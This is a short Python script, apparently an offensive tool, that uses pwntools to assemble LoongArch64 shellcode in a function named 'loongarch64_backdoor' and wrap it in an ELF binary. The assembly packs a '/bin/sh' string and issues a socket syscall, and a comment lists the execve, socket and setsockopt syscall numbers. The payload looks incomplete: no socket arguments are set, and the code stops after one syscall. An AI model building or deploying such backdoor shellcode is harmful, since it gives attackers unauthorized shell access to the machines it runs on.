from pwn import context,asm,pwnlib,log
import my_package

'''
execve 0xdd
socket 0xc6
setsockopt 0xd0

'''

def loongarch64_backdoor():
    context.architectures['loongarch64'] = {'endian': 'little', 'bits': 64}
    context.arch = 'loongarch64'
    shellcode = '''
.section .shellcode,"awx"
.global _start
.global __start
.p2align 2
_start:
__start:
addi.d	$r3,$r3,-48(0xfd0)
st.d	$r1,$r3,40(0x28)
st.d	$r22,$r3,32(0x20)
addi.d	$r22,$r3,48(0x30)
lu12i.w	$r12,18(0x12)
ori	$r12,$r12,0x345
st.w	$r12,$r22,-20(0xfec)
addi.w	$r12,$r0,4(0x4)
st.w	$r12,$r22,-32(0xfe0)
lu12i.w	$r12,452246(0x6e696)
ori	$r12,$r12,0x22f
lu32i.d	$r12,-494801(0x8732f)
lu52i.d	$r12,$r12,6(0x6)
st.d	$r12,$r22,-40(0xfd8)
addi.d	$r12,$r22,-40(0xfd8)
ori	$r11,$r0,0xc6
syscall 0x0
    '''
    my_package.my_make_loongarch64_elf(shellcode)

loongarch64_backdoor()